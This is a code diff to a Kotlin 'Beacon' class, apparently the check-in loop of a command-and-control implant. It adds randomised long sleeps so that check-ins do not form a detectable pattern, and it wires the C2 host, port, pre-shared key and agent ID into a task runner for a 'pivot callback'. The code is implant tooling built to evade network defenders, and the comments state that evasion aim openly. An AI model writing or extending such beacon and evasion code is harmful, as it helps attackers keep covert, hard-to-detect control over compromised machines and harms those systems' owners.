@@ -28,6 +28,9 @@ class Beacon(
 
     private var sleep = config.sleepSec.toLong()
     private var jitter = config.jitterPercent
+
+    /** Sleep obfuscation: an occasional long nap hides the metronome. */
+    private var sleepObfuscate = true
     private var failures = 0
 
     /**
@@ -39,6 +42,17 @@ class Beacon(
         synchronized(lifecycle) {
             if (running.get() || thread != null) return
             running.set(true)
+            // The pivot callback needs the server address and the agent key.
+            TaskRunner.configure(
+                TaskRunner.Context(
+                    host = config.host,
+                    port = config.port,
+                    psk = config.psk,
+                    agentId = config.agentId,
+                    version = config.version,
+                    log = { message -> log(message) },
+                )
+            )
             val t = Thread({ loop() }, "umbra-beacon")
             t.isDaemon = true
             thread = t
@@ -109,12 +123,26 @@ class Beacon(
     /** Exponential backoff, capped at 5 doublings (max 5 min). */
     private fun backoffSeconds(): Long = (sleep * (1L shl (failures.coerceAtMost(5)))).coerceAtMost(300)
 
+    /**
+     * Sleep interval with jitter and obfuscation.
+     *
+     * The jitter spreads the check-ins around the configured interval: uniform
+     * in [sleep*(1-j), sleep*(1+j)].  The obfuscation adds an occasional long
+     * nap on top of it, because a perfectly uniform distribution is a
+     * signature of its own.
+     */
     private fun nextIntervalSeconds(): Long {
         val base = sleep.toDouble()
         val j = jitter.coerceIn(0, 90) / 100.0
         val lo = (base * (1.0 - j)).coerceAtLeast(1.0)
         val hi = (base * (1.0 + j)).coerceAtLeast(lo)
-        return (lo + (hi - lo) * Random.nextDouble()).toLong().coerceAtLeast(1)
+        var interval = (lo + (hi - lo) * Random.nextDouble()).toLong()
+        if (sleepObfuscate && Random.nextDouble() < 0.25) {
+            // One check-in in four takes a long nap: 1.5 to 3.5 times the
+            // jittered interval.
+            interval = (interval * (1.5 + 2.0 * Random.nextDouble())).toLong()
+        }
+        return interval.coerceAtLeast(1)
     }
 
     /** One full beacon cycle. Returns false when the server told us to exit. */
